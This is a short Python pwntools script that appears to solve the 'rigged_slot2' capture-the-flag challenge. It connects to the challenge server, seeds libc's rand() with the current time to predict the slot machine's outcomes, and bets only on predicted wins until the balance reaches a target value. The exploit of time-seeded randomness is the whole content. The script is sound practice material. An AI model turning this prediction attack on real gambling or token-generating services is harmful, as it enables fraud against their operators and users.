from pwn import *
from ctypes import *
import random
import time

context.arch = "amd64"

e = context.binary = ELF("rigged_slot2")

libc = cdll.LoadLibrary(e.libc.path)

#p=e.process()
p = remote("riggedslot2.ctf.intigriti.io", 1337)


print(p.recv())

#guess = 0xffff
#while guess%1000>=0x1e:
#    _time = libc.time(0x0)
#    libc.srand(_time)
#    guess = libc.rand()
#    time.sleep(1)
    #print(_time,guess)
    
user_id = b'a'*10
#start_time = time.time()  # Record start time
p.sendline(user_id)
#p.recvline()  # Adjust based on expected server response
#end_time = time.time()  # Record end time
#rtt = end_time - start_time
#print(rtt)


#_time = time.time()
_time = libc.time(0x0)	
	
libc.srand(_time)
print(_time)
print(p.recv())

total = 100

while total!=0x14684c:
    bet = min(100, total)
    guess = libc.rand()
    rnd = guess%1000
    if rnd>=0x1e or total>0x14684c:
    	p.sendline("1")
    	total = total - 1
    else:
    	p.sendline(str(int(bet)))
    	c = 0
    	if rnd < 0x1e:
    		c=1
    	if rnd < 0xf:
    		c=2
    	if rnd < 10:
    		c=3
    	if rnd <5:
    		c=5
    	if rnd == 0:
    		c=10
    	total = total+bet*(c-1)
    print(p.recv())

print(p.recv())
print(p.recv())
